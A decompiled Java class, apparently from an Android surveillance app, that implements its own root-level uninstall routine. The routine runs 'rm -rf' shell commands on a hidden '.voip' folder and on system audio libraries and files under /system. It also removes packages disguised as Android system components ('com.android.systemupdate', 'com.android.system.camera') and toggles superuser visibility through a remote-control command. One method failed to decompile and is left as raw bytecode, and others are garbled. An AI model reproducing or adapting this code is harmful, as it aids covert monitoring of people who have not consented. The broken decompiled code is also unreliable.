package com.vvt.polymorphic;

import android.content.Context;
import android.os.SystemClock;
import com.fx.daemon.exception.UninstallationException;
import com.vvt.io.d;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.File;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.HashSet;

public class b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static ArrayList a(String paramString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    File localFile = new java/io/File;
    localFile.<init>(paramString);
    String[] arrayOfString = localFile.list();
    if (arrayOfString != null)
    {
      int i = arrayOfString.length;
      if (i > 0)
      {
        int j = arrayOfString.length;
        i = 0;
        localFile = null;
        while (i < j)
        {
          String str1 = arrayOfString[i];
          boolean bool = com.fx.daemon.b.c(str1);
          if (!bool)
          {
            String str2 = com.vvt.m.a.a;
            bool = str2.equals(str1);
            if (!bool) {}
          }
          else
          {
            localArrayList.add(str1);
          }
          i += 1;
        }
      }
    }
    return localArrayList;
  }
  
  /* Error */
  public static void a()
  {
    // Byte code:
    //   0: iconst_3
    //   1: istore_0
    //   2: iconst_2
    //   3: istore_1
    //   4: iconst_1
    //   5: istore_2
    //   6: aconst_null
    //   7: astore_3
    //   8: getstatic 13	com/vvt/polymorphic/removeFromPath:a	Z
    //   11: istore 4
    //   13: iload 4
    //   15: ifeq +3 -> 18
    //   18: new 19	java/util/ArrayList
    //   21: astore 5
    //   23: iload_0
    //   24: anewarray 45	java/lang/String
    //   27: astore 6
    //   29: aload 6
    //   31: iconst_0
    //   32: ldc 57
    //   34: aastore
    //   35: aload 6
    //   37: iload_2
    //   38: ldc 59
    //   40: aastore
    //   41: aload 6
    //   43: iload_1
    //   44: ldc 61
    //   46: aastore
    //   47: aload 6
    //   49: invokestatic 67	java/util/Arrays:asList	([Ljava/lang/Object;)Ljava/util/List;
    //   52: astore 6
    //   54: aload 5
    //   56: aload 6
    //   58: invokespecial 70	java/util/ArrayList:<init>	(Ljava/util/Collection;)V
    //   61: new 19	java/util/ArrayList
    //   64: astore 7
    //   66: bipush 12
    //   68: anewarray 45	java/lang/String
    //   71: astore 6
    //   73: aload 6
    //   75: iconst_0
    //   76: ldc 73
    //   78: aastore
    //   79: aload 6
    //   81: iload_2
    //   82: ldc 75
    //   84: aastore
    //   85: aload 6
    //   87: iload_1
    //   88: ldc 77
    //   90: aastore
    //   91: ldc 79
    //   93: astore 8
    //   95: aload 6
    //   97: iload_0
    //   98: aload 8
    //   100: aastore
    //   101: aload 6
    //   103: iconst_4
    //   104: ldc 82
    //   106: aastore
    //   107: aload 6
    //   109: iconst_5
    //   110: ldc 85
    //   112: aastore
    //   113: aload 6
    //   115: bipush 6
    //   117: ldc 88
    //   119: aastore
    //   120: aload 6
    //   122: bipush 7
    //   124: ldc 91
    //   126: aastore
    //   127: aload 6
    //   129: bipush 8
    //   131: ldc 94
    //   133: aastore
    //   134: aload 6
    //   136: bipush 9
    //   138: ldc 97
    //   140: aastore
    //   141: aload 6
    //   143: bipush 10
    //   145: ldc 100
    //   147: aastore
    //   148: bipush 11
    //   150: istore 9
    //   152: ldc 103
    //   154: astore_3
    //   155: aload 6
    //   157: iload 9
    //   159: aload_3
    //   160: aastore
    //   161: aload 6
    //   163: invokestatic 67	java/util/Arrays:asList	([Ljava/lang/Object;)Ljava/util/List;
    //   166: astore 6
    //   168: aload 7
    //   170: aload 6
    //   172: invokespecial 70	java/util/ArrayList:<init>	(Ljava/util/Collection;)V
    //   175: iconst_0
    //   176: istore 4
    //   178: aconst_null
    //   179: astore 6
    //   181: invokestatic 108	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   184: astore 8
    //   186: ldc 110
    //   188: astore 6
    //   190: aload 5
    //   192: invokevirtual 114	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   195: astore_3
    //   196: aload_3
    //   197: invokeinterface 120 1 0
    //   202: istore 4
    //   204: iload 4
    //   206: ifeq +260 -> 466
    //   209: aload_3
    //   210: invokeinterface 124 1 0
    //   215: astore 6
    //   217: aload 6
    //   219: astore 10
    //   221: aload 6
    //   223: checkcast 45	java/lang/String
    //   226: astore 10
    //   228: aload 10
    //   230: astore 5
    //   232: aload 7
    //   234: invokevirtual 114	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   237: astore 11
    //   239: aload 11
    //   241: invokeinterface 120 1 0
    //   246: istore 4
    //   248: iload 4
    //   250: ifeq -54 -> 196
    //   253: aload 11
    //   255: invokeinterface 124 1 0
    //   260: astore 6
    //   262: aload 6
    //   264: checkcast 45	java/lang/String
    //   267: astore 6
    //   269: getstatic 13	com/vvt/polymorphic/removeFromPath:a	Z
    //   272: istore_1
    //   273: iload_1
    //   274: ifeq +3 -> 277
    //   277: ldc 126
    //   279: astore 12
    //   281: iconst_1
    //   282: istore_0
    //   283: iload_0
    //   284: anewarray 4	java/lang/Object
    //   287: astore 13
    //   289: iconst_0
    //   290: istore 14
    //   292: aload 13
    //   294: iconst_0
    //   295: aload 5
    //   297: aastore
    //   298: aload 12
    //   300: aload 13
    //   302: invokestatic 130	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   305: astore 12
    //   307: aload 8
    //   309: aload 12
    //   311: invokevirtual 133	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   314: pop
    //   315: ldc -121
    //   317: astore 12
    //   319: iconst_2
    //   320: istore_0
    //   321: iload_0
    //   322: anewarray 4	java/lang/Object
    //   325: astore 13
    //   327: iconst_0
    //   328: istore 14
    //   330: aload 13
    //   332: iconst_0
    //   333: aload 5
    //   335: aastore
    //   336: iconst_1
    //   337: istore 14
    //   339: aload 13
    //   341: iload 14
    //   343: aload 6
    //   345: aastore
    //   346: aload 12
    //   348: aload 13
    //   350: invokestatic 130	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   353: astore 6
    //   355: getstatic 13	com/vvt/polymorphic/removeFromPath:a	Z
    //   358: istore_1
    //   359: iload_1
    //   360: ifeq +3 -> 363
    //   363: ldc -119
    //   365: astore 12
    //   367: iconst_1
    //   368: istore_0
    //   369: iload_0
    //   370: anewarray 4	java/lang/Object
    //   373: astore 13
    //   375: iconst_0
    //   376: istore 14
    //   378: aload 13
    //   380: iconst_0
    //   381: aload 6
    //   383: aastore
    //   384: aload 12
    //   386: aload 13
    //   388: invokestatic 130	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   391: astore 6
    //   393: aload 8
    //   395: aload 6
    //   397: invokevirtual 133	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   400: pop
    //   401: goto -162 -> 239
    //   404: astore 6
    //   406: aload 8
    //   408: astore 6
    //   410: getstatic 17	com/vvt/polymorphic/removeFromPath:removeFromPath	Z
    //   413: istore 15
    //   415: iload 15
    //   417: ifeq +3 -> 420
    //   420: aload 6
    //   422: ifnull +8 -> 430
    //   425: aload 6
    //   427: invokevirtual 140	com/vvt/shell/f:d	()V
    //   430: getstatic 13	com/vvt/polymorphic/removeFromPath:a	Z
    //   433: istore 4
    //   435: iload 4
    //   437: ifeq +3 -> 440
    //   440: return
    //   441: astore 5
    //   443: iconst_0
    //   444: istore 9
    //   446: aconst_null
    //   447: astore 8
    //   449: aload 5
    //   451: astore 6
    //   453: aload 8
    //   455: ifnull +8 -> 463
    //   458: aload 8
    //   460: invokevirtual 140	com/vvt/shell/f:d	()V
    //   463: aload 6
    //   465: athrow
    //   466: aload 8
    //   468: ifnull -38 -> 430
    //   471: aload 8
    //   473: invokevirtual 140	com/vvt/shell/f:d	()V
    //   476: goto -46 -> 430
    //   479: astore 6
    //   481: goto -28 -> 453
    //   484: astore 5
    //   486: aload 6
    //   488: astore 8
    //   490: aload 5
    //   492: astore 6
    //   494: goto -41 -> 453
    //   497: astore 5
    //   499: goto -89 -> 410
    // Local variable table:
    //   start	length	slot	name	signature
    //   1	369	0	i	int
    //   3	85	1	j	int
    //   272	88	1	bool1	boolean
    //   5	77	2	k	int
    //   7	203	3	localObject1	Object
    //   11	425	4	bool2	boolean
    //   21	313	5	localObject2	Object
    //   441	9	5	localObject3	Object
    //   484	7	5	localObject4	Object
    //   497	1	5	localException1	Exception
    //   27	369	6	localObject5	Object
    //   404	1	6	localException2	Exception
    //   408	56	6	localObject6	Object
    //   479	8	6	localObject7	Object
    //   492	1	6	localObject8	Object
    //   64	169	7	localArrayList	ArrayList
    //   93	396	8	localObject9	Object
    //   150	295	9	m	int
    //   219	10	10	localObject10	Object
    //   237	17	11	localIterator	java.util.Iterator
    //   279	106	12	str	String
    //   287	100	13	arrayOfObject	Object[]
    //   290	87	14	n	int
    //   413	3	15	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   190	195	404	java/lang/Exception
    //   196	202	404	java/lang/Exception
    //   209	215	404	java/lang/Exception
    //   221	226	404	java/lang/Exception
    //   232	237	404	java/lang/Exception
    //   239	246	404	java/lang/Exception
    //   253	260	404	java/lang/Exception
    //   262	267	404	java/lang/Exception
    //   269	272	404	java/lang/Exception
    //   283	287	404	java/lang/Exception
    //   295	298	404	java/lang/Exception
    //   300	305	404	java/lang/Exception
    //   309	315	404	java/lang/Exception
    //   321	325	404	java/lang/Exception
    //   333	336	404	java/lang/Exception
    //   343	346	404	java/lang/Exception
    //   348	353	404	java/lang/Exception
    //   355	358	404	java/lang/Exception
    //   369	373	404	java/lang/Exception
    //   381	384	404	java/lang/Exception
    //   386	391	404	java/lang/Exception
    //   395	401	404	java/lang/Exception
    //   181	184	441	finally
    //   190	195	479	finally
    //   196	202	479	finally
    //   209	215	479	finally
    //   221	226	479	finally
    //   232	237	479	finally
    //   239	246	479	finally
    //   253	260	479	finally
    //   262	267	479	finally
    //   269	272	479	finally
    //   283	287	479	finally
    //   295	298	479	finally
    //   300	305	479	finally
    //   309	315	479	finally
    //   321	325	479	finally
    //   333	336	479	finally
    //   343	346	479	finally
    //   348	353	479	finally
    //   355	358	479	finally
    //   369	373	479	finally
    //   381	384	479	finally
    //   386	391	479	finally
    //   395	401	479	finally
    //   410	413	484	finally
    //   181	184	497	java/lang/Exception
  }
  
  public static void a(com.fx.daemon.a parama)
  {
    boolean bool = a;
    if (bool) {}
    try
    {
      bool = a;
      if (bool) {}
      g();
      bool = a;
      if (bool) {}
      bool = true;
      ShellUtil.a(bool);
      bool = a;
      if (bool) {}
      com.fx.daemon.b.a();
      bool = a;
      if (bool) {}
      d();
      bool = a;
      if (bool) {}
      String str = com.vvt.m.b.c;
      com.fx.daemon.b.d(str);
      bool = a;
      if (bool) {}
      str = com.vvt.m.b.c;
      com.fx.daemon.b.e(str);
      bool = a;
      if (bool) {}
      e();
      bool = a;
      if (bool) {}
      f();
      bool = a;
      if (bool) {}
      a();
      bool = a;
      if (bool) {}
      c();
      bool = a;
      if (bool) {}
      b();
      bool = a;
      if (bool) {}
      bool = false;
      str = null;
      ShellUtil.a(false);
      bool = a;
      if (bool) {}
      parama.f();
      bool = a;
      if (bool) {}
      return;
    }
    catch (Exception localException)
    {
      UninstallationException localUninstallationException = new com/fx/daemon/exception/UninstallationException;
      localUninstallationException.<init>();
      throw localUninstallationException;
    }
  }
  
  public static boolean a(Context paramContext, String paramString)
  {
    return com.vvt.b.b.a(paramContext.getPackageManager(), false).contains(paramString);
  }
  
  public static boolean a(Context paramContext, String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a(paramContext, paramString2);
    boolean bool2 = a;
    if ((!bool2) || (!bool1))
    {
      bool1 = true;
      try
      {
        ShellUtil.a(bool1);
        Object localObject1 = com.fx.daemon.b.a(paramString2, paramString1);
        if (localObject1 == null)
        {
          localObject1 = new java/io/FileNotFoundException;
          ((FileNotFoundException)localObject1).<init>();
          throw ((Throwable)localObject1);
        }
      }
      catch (FileNotFoundException localFileNotFoundException)
      {
        bool2 = a;
        if (bool2) {}
        throw localFileNotFoundException;
      }
      finally
      {
        ShellUtil.a(false);
      }
      bool2 = a;
      if (bool2) {}
      String str2 = "%s/%s";
      int i = 2;
      Object[] arrayOfObject = new Object[i];
      int j = 0;
      arrayOfObject[0] = paramString1;
      j = 1;
      arrayOfObject[j] = localObject2;
      String str1 = String.format(str2, arrayOfObject);
      ShellUtil.g(str1);
      long l = 2000L;
      SystemClock.sleep(l);
      bool1 = a(paramContext, paramString2);
      bool2 = a;
      if (bool2) {}
      ShellUtil.a(false);
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private static void b()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    localObject1 = null;
    try
    {
      localObject1 = f.b();
      String str1;
      String str2;
      int i;
      Object[] arrayOfObject;
      boolean bool2;
      if (localObject2 == null) {
        break label121;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          str1 = d.a();
          str2 = "%s/.voip";
          i = 1;
          arrayOfObject = new Object[i];
          arrayOfObject[0] = str1;
          str1 = String.format(str2, arrayOfObject);
          str2 = "rm -rf %s";
          i = 1;
          arrayOfObject = new Object[i];
          arrayOfObject[0] = str1;
          str1 = String.format(str2, arrayOfObject);
          ((f)localObject1).a(str1);
          if (localObject1 != null) {
            ((f)localObject1).d();
          }
          return;
        }
        finally
        {
          Object localObject2 = localObject1;
          localObject1 = localObject4;
          continue;
        }
        localException = localException;
        bool2 = b;
        if ((bool2) && (localObject1 == null)) {}
      }
    }
    finally
    {
      localObject3 = finally;
      bool2 = false;
      localObject2 = null;
      localObject1 = localObject3;
    }
    ((f)localObject2).d();
    label121:
    throw ((Throwable)localObject1);
  }
  
  private static void c()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    localObject1 = null;
    try
    {
      localObject1 = f.b();
      boolean bool2;
      String str;
      if (localObject2 == null) {
        break label75;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          bool2 = a;
          if (bool2) {}
          str = "rm -rf /system/usr/share/alsa;rm /system/xbin/alsa_amixer;rm /system/lib/libasound.so;rm /system/lib64/libasound.so;";
          ((f)localObject1).a(str);
          if (localObject1 != null) {
            ((f)localObject1).d();
          }
          return;
        }
        finally
        {
          Object localObject2 = localObject1;
          localObject1 = localObject4;
          continue;
        }
        localException = localException;
        bool2 = b;
        if ((bool2) && (localObject1 == null)) {}
      }
    }
    finally
    {
      localObject3 = finally;
      bool2 = false;
      localObject2 = null;
      localObject1 = localObject3;
    }
    ((f)localObject2).d();
    label75:
    throw ((Throwable)localObject1);
  }
  
  private static boolean d()
  {
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.am.a locala = new com/vvt/am/a;
    locala.<init>();
    locala.c("busybox");
    String str = com.vvt.m.b.c;
    locala.b(str);
    bool1 = locala.a();
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private static void e()
  {
    com.vvt.r.a.a("com.android.systemupdate", false);
  }
  
  private static void f()
  {
    boolean bool = a;
    if (bool) {}
    String str = "com.android.system.camera";
    ShellUtil.h(str);
    bool = a;
    if (bool) {}
  }
  
  private static void g()
  {
    bool1 = false;
    localObject1 = null;
    try
    {
      localObject1 = com.vvt.remotecontrol.b.a();
    }
    catch (RemoteControlException localRemoteControlException2)
    {
      for (;;)
      {
        try
        {
          ControlCommand localControlCommand;
          Object localObject2;
          localObject1 = ((com.vvt.remotecontrol.a)localObject1).execute(localControlCommand);
          bool2 = localObject1 instanceof RmtCtrlOutputStatusMessage;
          if (bool2)
          {
            localObject1 = (RmtCtrlOutputStatusMessage)localObject1;
            ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
            bool1 = a;
            if (!bool1) {}
          }
          return;
        }
        catch (RemoteControlException localRemoteControlException1)
        {
          boolean bool2;
          bool1 = b;
          if (!bool1) {
            continue;
          }
          continue;
        }
        localRemoteControlException2 = localRemoteControlException2;
        bool2 = b;
        if (!bool2) {}
      }
    }
    if (localObject1 != null)
    {
      localControlCommand = new com/vvt/remotecontrol/ControlCommand;
      localControlCommand.<init>();
      localObject2 = RemoteFunction.SET_SUPERUSER_VISIBILITY;
      localControlCommand.setFunction((RemoteFunction)localObject2);
      localObject2 = "1";
      localControlCommand.setData(localObject2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/polymorphic/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */